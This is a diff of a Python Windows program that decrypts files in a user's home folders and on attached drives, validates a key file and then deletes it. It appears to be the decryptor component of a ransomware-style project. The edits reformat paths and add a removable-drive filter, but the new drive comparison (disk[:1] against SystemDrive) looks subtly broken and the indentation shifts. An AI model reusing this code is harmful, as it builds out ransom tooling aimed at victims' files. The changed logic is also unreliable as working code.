@@ -53,7 +53,7 @@ except KeyboardInterrupt:
 
 def is_valid_key(key):
     try:
-        key_file = os.path.join(f"C:\\Users\\{getpass.getuser()}", "key.sha256")
+        key_file = os.path.join(rf"C:\Users\{getpass.getuser()}", "key.sha256")
         if magic != b"DCRY+DKEY$":
             return False
         if not key or len(key) != 32 or not os.path.exists(key_file):
@@ -70,23 +70,35 @@ def start_decryption():
         input("Press enter to exit...")
         sys.exit(2)
     if not dev_mode:
-        decrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Desktop"), key)
-        decrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Downloads"), key)
-        decrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Documents"), key)
-        decrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Pictures"), key)
-        decrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Videos"), key)
+        decrypt_directory(
+            os.path.join(rf"C:\Users\{getpass.getuser()}", "Desktop"), key
+        )
+        decrypt_directory(
+            os.path.join(rf"C:\Users\{getpass.getuser()}", "Downloads"), key
+        )
+        decrypt_directory(
+            os.path.join(rf"C:\Users\{getpass.getuser()}", "Documents"), key
+        )
+        decrypt_directory(
+            os.path.join(rf"C:\Users\{getpass.getuser()}", "Pictures"), key
+        )
+        decrypt_directory(
+            os.path.join(rf"C:\Users\{getpass.getuser()}", "Videos"), key
+        )
         bitmask = ctypes.windll.kernel32.GetLogicalDrives()
         for disk in [
-            f"{letter}:/"
-            for i, letter in enumerate(string.ascii_uppercase)
-            if bitmask & (1 << i)
-        ]:
-            if disk[:2] != os.getenv("SystemDrive") and disk[:2] != os.getenv("HOMEDRIVE"):
+             f"{letter}:\\"
+             for i, letter in enumerate(string.ascii_uppercase)
+             if bitmask & (1 << i)
+         ]:
+             if (
+                 disk[:1] != os.getenv("SystemDrive")
+                 and disk[:1] != os.getenv("HOMEDRIVE")
+                 and ctypes.windll.kernel32.GetDriveTypeW(disk) == 2
+             ):
                 decrypt_directory(disk, key)
     else:
-        decrypt_directory(
-            ".\\tests", key
-        )
+        decrypt_directory(r".\tests", key)
 
 
 def decrypt_directory(directory_path, key):
@@ -112,12 +124,13 @@ def main():
                 os.remove(shortcut_path)
             except:
                 pass
-    key_path = os.path.join(f"C:\\Users\\{getpass.getuser()}", "key.sha256")
+    key_path = os.path.join(rf"C:\Users\{getpass.getuser()}", "key.sha256")
     if os.path.exists(key_path):
         try:
             os.remove(key_path)
         except:
             pass
+
 
 dev_mode = True
 if __name__ == "__main__":
